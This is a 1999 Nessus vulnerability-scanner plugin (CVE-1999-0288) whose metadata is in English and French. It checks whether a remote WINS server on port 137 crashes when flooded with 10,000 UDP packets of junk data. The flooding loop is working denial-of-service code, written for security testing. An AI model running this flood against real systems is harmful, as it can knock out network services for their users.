#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10315);
 script_bugtraq_id(298);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-1999-0288");
 name["english"] = "WINS UDP flood denial";
 name["francais"] = "WINS UDP flood denial";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
We could crash the remote WINS server
by sending it a lot of UDP packets containing
random data.

If you do not use WINS, then deactivate this
server.


An attacker may use this flaw to bring down
your NT network.

Solution : install NT SP5.

Risk factor : High";


 desc["francais"] = "
Il s'est avéré possible de faire planter
le serveur WINS distant en lui envoyant
des paquets UDP contenant des données arbitraires.

Si vous n'utilisez pas WINS, désactivez ce serveur.

Un pirate peut utiliser ce problème pour mettre à
genoux votre réseau NT.

Solution : Installez NT SP5.

Facteur de risque : Sérieux.";
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote WINS server";
 summary["francais"] = "Fait planter le serveur WINS distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);	# ACT_FLOOD?
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(137);
 exit(0);
}

#
# The script code starts here
#

if(get_port_state(137))
{
 soc = open_sock_tcp(137);
 if(soc)
 {
  close(soc);
  udp_soc = open_sock_udp(137);
  crp = crap(1000);
  
  for(j=0;j<10000;j=j+1)
  {
   send(socket:udp_soc, data:crp);
  }
  
  close(udp_soc);
  
  soc = open_sock_tcp(137);
  if(!soc)security_hole(137);
  else close(soc);
 }
}
